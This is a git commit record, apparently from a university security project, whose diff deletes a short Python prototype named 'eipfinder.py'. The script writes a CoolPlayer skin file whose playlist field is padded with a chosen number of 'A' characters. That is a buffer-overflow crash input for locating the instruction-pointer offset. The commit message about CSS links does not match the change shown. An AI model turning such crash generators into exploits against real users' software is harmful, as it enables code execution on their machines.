5f031142fa35e7621534e8b8b5f7e3bf9a2cb381
Declan Woodham <1701185@abertay.ac.uk>
2020-04-20 13:04:23 +0100

    added css CDN's to report export to html function

--- prototyping/eipfinder.py
+++
@@ -1,9 +0,0 @@
-import sys
-
-if __name__ == '__main__':
-    with open("crash.ini", "w") as f:
-        f.write("[CoolPlayer Skin]\n")
-        f.write("PlaylistSkin=")
-        f.write("\x41" * int(sys.argv[1]))
-
-    print("Done")
